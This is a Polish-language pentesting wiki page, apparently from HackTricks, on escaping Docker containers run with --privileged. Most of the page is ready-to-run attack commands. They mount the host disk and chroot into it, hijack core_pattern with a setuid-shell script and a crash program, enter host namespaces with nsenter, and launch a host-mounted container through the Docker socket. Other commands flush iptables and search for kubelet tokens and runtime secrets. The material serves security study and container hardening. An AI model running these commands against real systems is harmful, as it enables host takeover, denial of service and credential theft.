# Ucieczka z kontenerów `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Kontener uruchomiony z `--privileged` nie jest tym samym co zwykły kontener z jedną czy dwiema dodatkowymi uprawnieniami. W praktyce `--privileged` usuwa lub osłabia kilka domyślnych mechanizmów ochrony środowiska uruchomieniowego, które normalnie chronią procesy w kontenerze przed niebezpiecznymi zasobami hosta. Dokładny efekt zależy od runtime i hosta, ale dla Docker zwykle skutkuje to:

- wszystkie capabilities są przyznane
- ograniczenia device cgroup są zniesione
- wiele systemów plików jądra przestaje być montowanych w trybie tylko do odczytu
- domyślnie maskowane ścieżki procfs znikają
- filtrowanie seccomp jest wyłączone
- ograniczenia AppArmor są wyłączone
- izolacja SELinux jest wyłączona lub zastąpiona znacznie szerszą etykietą

Ważny wniosek jest taki, że kontener uruchomiony z `--privileged` zazwyczaj nie potrzebuje subtelnego exploita jądra. W wielu przypadkach może po prostu komunikować się bezpośrednio z urządzeniami hosta, kernelowymi systemami plików widocznymi dla hosta lub interfejsami runtime, a następnie uzyskać powłokę hosta.

## Czego `--privileged` nie zmienia automatycznie

`--privileged` **nie** łączy automatycznie przestrzeni nazw PID, network, IPC ani UTS hosta. Kontener uruchomiony z `--privileged` nadal może mieć prywatne przestrzenie nazw. To oznacza, że niektóre łańcuchy eskalacji wymagają dodatkowego warunku, takiego jak:

- host bind mount
- dzielenie PID z hostem
- sieć hosta
- widoczne urządzenia hosta
- zapisywalne interfejsy proc/sys

Te warunki są często łatwe do spełnienia w rzeczywistych błędnych konfiguracjach, ale są koncepcyjnie niezależne od samego `--privileged`.

## Ścieżki ucieczki

### 1. Zamontowanie dysku hosta przez widoczne urządzenia

Kontener uruchomiony z `--privileged` zwykle widzi znacznie więcej węzłów urządzeń pod `/dev`. Jeśli blokowe urządzenie hosta jest widoczne, najprostsza ucieczka to zamontowanie go i użycie `chroot` do systemu plików hosta:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Jeśli partycja root nie jest oczywista, najpierw wypisz układ bloków:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Jeśli praktyczną ścieżką jest umieszczenie setuid helpera w zapisywalnym punkcie montowania hosta zamiast `chroot`, pamiętaj, że nie każdy system plików honoruje bit setuid. Szybki test możliwości po stronie hosta to:
```bash
mount | grep -v "nosuid"
```
To jest przydatne, ponieważ zapisywalne ścieżki na systemach plików z `nosuid` są znacznie mniej interesujące dla klasycznych "drop a setuid shell and execute it later" workflows.

Osłabione mechanizmy ochronne wykorzystywane tutaj to:

- pełny dostęp do urządzeń
- szerokie capabilities, szczególnie `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Zamontuj lub ponownie użyj host bind mount i `chroot`

Jeśli system plików root hosta jest już zamontowany wewnątrz kontenera, lub jeśli kontener może utworzyć niezbędne punkty montowania, ponieważ jest uprzywilejowany, powłoka hosta często jest tylko jedno `chroot` dalej:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Jeśli nie istnieje host root bind mount, ale host storage jest osiągalny, utwórz jeden:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Ta ścieżka wykorzystuje:

- osłabione mount restrictions
- pełne capabilities
- brak MAC confinement

Powiązane strony:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Nadużywanie zapisywalnego `/proc/sys` lub `/sys`

Jednym z głównych skutków `--privileged` jest to, że zabezpieczenia procfs i sysfs stają się znacznie słabsze. Może to ujawnić interfejsy jądra skierowane na hosta, które zazwyczaj są maskowane lub montowane jako tylko do odczytu.

Klasycznym przykładem jest `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Inne ścieżki o wysokiej wartości obejmują:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ta ścieżka wykorzystuje:

- brak masked paths
- brak read-only system paths

Powiązane strony:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Użyj pełnych capabilities dla Mount- Or Namespace-Based Escape

Uprzywilejowany kontener otrzymuje capabilities, które normalnie są usuwane z standardowych kontenerów, w tym `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, i wiele innych. To często wystarcza, aby zamienić lokalny foothold w host escape, gdy tylko pojawi się inna wystawiona powierzchnia.

Prosty przykład to montowanie dodatkowych systemów plików i użycie namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Jeśli PID hosta jest również współdzielony, krok staje się jeszcze krótszy:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ta ścieżka wykorzystuje:

- the default privileged capability set
- optional host PID sharing

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

Privileged container często ma widoczny stan runtime hosta lub jego gniazda. Jeśli socket Docker, containerd lub CRI-O jest osiągalny, najprostszym podejściem bywa użycie runtime API do uruchomienia drugiego kontenera z dostępem do hosta:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Dla containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Ten wektor wykorzystuje:

- ujawnienie privileged runtime
- host bind mounts utworzone przez sam runtime

Powiązane strony:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Usuń skutki uboczne izolacji sieci

`--privileged` sam w sobie nie dołącza do przestrzeni nazw sieci hosta, ale jeśli kontener ma również `--network=host` lub inny dostęp do sieci hosta, cały stos sieciowy staje się modyfikowalny:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Nie zawsze daje to bezpośredni shell na hoście, ale może prowadzić do denial of service, traffic interception lub dostępu do usług zarządzania dostępnych tylko na loopback.

Powiązane strony:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Odczyt sekretów hosta i stanu runtime

Nawet jeśli bezpośrednie uzyskanie shellu na hoście nie następuje od razu, kontenery uprzywilejowane często mają wystarczający dostęp, aby odczytać sekrety hosta, stan kubeleta, metadane runtime oraz systemy plików sąsiednich kontenerów:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Jeżeli `/var` jest zamontowany z hosta lub katalogi runtime są widoczne, może to wystarczyć do lateral movement lub cloud/Kubernetes credential theft nawet zanim uzyskana zostanie powłoka na hoście.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Sprawdzenia

Celem poniższych poleceń jest potwierdzenie, które privileged-container escape families są natychmiast wykonalne.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Co jest tutaj interesujące:

- pełny zestaw capabilities, zwłaszcza `CAP_SYS_ADMIN`
- zapisywalny dostęp do proc/sys
- widoczne urządzenia hosta
- brak seccomp i ograniczeń MAC
- runtime sockets lub host root bind mounts

Każdy z nich może wystarczyć do post-exploitation. Kilka razem zwykle oznacza, że kontener jest w praktyce o jedno lub dwa polecenia od kompromitacji hosta.

## Powiązane strony

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
